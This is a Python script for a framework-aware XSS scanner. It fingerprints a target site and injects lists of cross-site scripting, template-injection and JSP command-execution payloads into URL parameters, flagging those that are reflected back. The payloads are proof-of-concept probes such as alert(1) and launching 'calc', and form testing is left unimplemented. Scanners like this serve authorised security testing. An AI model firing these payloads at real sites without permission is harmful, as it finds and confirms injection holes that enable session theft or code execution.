#!/usr/bin/env python3
"""
Framework-Specific XSS Scanner
Tests PHP, Python, Java, Node.js, React, Angular, Vue.js
"""

import sys
import urllib.parse
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore

init(autoreset=True)

def scan_framework(url, framework='auto'):
    print(f"\n{Fore.CYAN}[*] Framework-Specific XSS Scanner{Fore.RESET}")
    print(f"[*] Target: {url}\n")
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    })
    
    try:
        response = session.get(url, timeout=10)
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        # Detect framework
        if framework == 'auto':
            if 'x-powered-by' in headers:
                if 'php' in headers['x-powered-by']:
                    framework = 'php'
                elif 'express' in headers['x-powered-by'] or 'node' in headers['x-powered-by']:
                    framework = 'nodejs'
                elif 'asp.net' in headers['x-powered-by']:
                    framework = 'dotnet'
            
            if framework == 'auto':
                if 'django' in content or 'csrfmiddlewaretoken' in content:
                    framework = 'python'
                elif 'react' in content or 'data-reactroot' in content:
                    framework = 'react'
                elif 'angular' in content or 'ng-app' in content:
                    framework = 'angular'
                elif 'vue' in content or 'v-bind' in content:
                    framework = 'vuejs'
                elif 'laravel' in content:
                    framework = 'php'
                elif 'spring' in content or 'th:' in content:
                    framework = 'java'
        
        print(f"{Fore.GREEN}[+] Detected Framework: {framework.upper()}{Fore.RESET}\n")
        
        # Framework-specific payloads
        payloads = {
            'php': [
                '<?php echo "<script>alert(1)</script>"; ?>',
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "';alert(1)//",
                '";alert(1)//',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
            ],
            'python': [
                '<script>alert(1)</script>',
                '{{ "".__class__.__mro__[1].__subclasses__() }}',
                '{{ config.items() }}',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
            ],
            'java': [
                '<%= Runtime.getRuntime().exec("calc") %>',
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '${7*7}',
                '#{7*7}',
                '<img src=x onerror=alert(1)>',
            ],
            'nodejs': [
                '<script>alert(1)</script>',
                '<%= alert(1) %>',
                '<%- alert(1) %>',
                '`${alert(1)}`',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
            ],
            'react': [
                '<script>alert(1)</script>',
                '{alert(1)}',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '"><img src=x onerror=alert(1)>',
                'onmouseover=alert(1)',
            ],
            'angular': [
                '{{constructor.constructor("return this")().alert(1)}}',
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '{{7*7}}',
                '<img src=x onerror=alert(1)>',
            ],
            'vuejs': [
                '<script>alert(1)</script>',
                '<svg @load=alert(1)>',
                'v-on:load=alert(1)',
                ':href="javascript:alert(1)"',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
            ],
            'dotnet': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "';alert(1)//",
                '";alert(1)//',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
            ],
        }
        
        # Get payloads for detected or specified framework
        test_payloads = payloads.get(framework, payloads['php'])
        test_payloads.extend(payloads.get('php', []))  # Add common payloads
        
        # Remove duplicates
        test_payloads = list(dict.fromkeys(test_payloads))
        
        # Extract parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params:
            print(f"{Fore.YELLOW}[*] Found {len(params)} parameters to test{Fore.RESET}")
            
            for param in params:
                print(f"\n{Fore.YELLOW}[*] Testing parameter: {param}{Fore.RESET}")
                for i, payload in enumerate(test_payloads, 1):
                    print(f"    {Fore.WHITE}[{i}/{len(test_payloads)}] Testing...", end='\r')
                    test_url = url.replace(f'{param}=', f'{param}={urllib.parse.quote(payload)}')
                    
                    try:
                        r = session.get(test_url, timeout=5)
                        if payload in r.text:
                            print(f"{Fore.GREEN}    [+] VULNERABLE!{Fore.RESET}")
                            print(f"{Fore.GREEN}    [+] Payload: {payload}{Fore.RESET}")
                            return True
                    except:
                        pass
            
            print(f"\n{Fore.RED}[-] No vulnerabilities found{Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}[*] No URL parameters found{Fore.RESET}")
            
        # Test forms
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if forms:
            print(f"\n{Fore.YELLOW}[*] Found {len(forms)} forms to test{Fore.RESET}")
            # Form testing would go here
            
        return False
        
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Fore.RESET}")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"{Fore.YELLOW}Usage: python framework_scanner.py <url> [framework]{Fore.RESET}")
        print(f"{Fore.YELLOW}Framework options: auto, php, python, java, nodejs, react, angular, vuejs{Fore.RESET}")
        sys.exit(1)
    
    url = sys.argv[1]
    framework = sys.argv[2] if len(sys.argv) > 2 else 'auto'
    
    scan_framework(url, framework)
